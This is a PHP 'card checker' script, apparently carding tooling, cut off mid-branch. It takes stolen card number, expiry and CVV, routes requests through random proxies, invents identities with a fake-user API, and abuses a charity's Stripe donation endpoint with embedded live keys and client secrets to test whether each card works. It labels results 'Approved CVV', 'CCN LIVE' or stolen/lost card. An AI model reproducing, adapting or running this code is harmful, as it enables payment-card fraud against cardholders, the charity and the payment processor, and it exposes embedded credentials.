<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

$retry = 0;
retry:
if ($retry > 10){
  echo 'Maximum Retries Reached';
  return;
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

# -------------------- [1 REQ] -------------------#
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://matchbot-production.thebiggive.org.uk/v1/donations/7d5bf934-f015-4055-bcdf-04823273f8ce');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/json',
'origin: https://donate.thebiggive.org.uk',
'referer: https://donate.thebiggive.org.uk/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"billingPostalAddress":"'.$zip.'","clientSecret":"pi_3LFviUKkGuKkxwBN0DppXq78_secret_wrHEtaKJU80Gv6VCFMCprcild","charityFee":0.22,"charityFeeVat":0.04,"charityId":"0011r00002Hof3zAAB","charityName":"Magic Breakfast","countryCode":"GB","createdTime":"2022-06-29T07:53:41+00:00","currencyCode":"GBP","donationAmount":1,"donationId":"7d5bf934-f015-4055-bcdf-04823273f8ce","donationMatched":true,"emailAddress":"'.$email.'","feeCoverAmount":0,"firstName":"'.$firstname.'","giftAid":false,"lastName":"'.$lastname.'","matchedAmount":0,"matchReservedAmount":1,"optInCharityEmail":false,"optInChampionEmail":null,"optInTbgEmail":false,"projectId":"a056900002IeFEhAAN","psp":"stripe","status":"Pending","tipAmount":0,"tipGiftAid":false,"transactionId":"pi_3LFw23KkGuKkxwBN1e2ZwxA1","cardBrand":"visa","cardCountry":"CH"}');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LGDnZKkGuKkxwBN09WA2YrX/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'scheme: https',
'accept: application/json',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'cookie: ',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method_data[type]=card&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][name]='.$firstname.'+'.$lastname.'&payment_method_data[billing_details][address][country]=GB&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=9655674b-ac6f-4ee8-9faf-273dcee7c3756dfcd7&payment_method_data[muid]=219331b9-60ea-4bfa-9d96-49125fd2f3bfcefe0e&payment_method_data[sid]=50649e41-58b2-4081-ba76-1e60e08c6f325e0119&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fe63c37019%3B+stripe-js-v3%2Fe63c37019&payment_method_data[time_on_page]=72969&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51GxbdTKkGuKkxwBN1KsxsHMC8MrSeooSxBRETK6zoUYZSkKsjSLLryXE3vPIQm5jM6uV1Lsdvr9GoYB1dShkSELQ00xffCRBIi&client_secret=pi_3LGDnZKkGuKkxwBN09WA2YrX_secret_hBXFbKyWJSUgTWFyUBnOqBK5Q');


$result2 = curl_exec($ch);

# ---------------------------------------#

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

if (strpos($result2, 'lock_timeout')) {
  $retry++;
  goto retry;
}

# ---------------- [Responses] ----------------- #

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "Thank You For Donation.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}
elseif
(strpos($result2,  '"Thank You For Donation."')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
} 
elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "incorrect_zip")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  '"type":"one-time"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "succeeded")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "three_d_secure_redirect")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'card number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
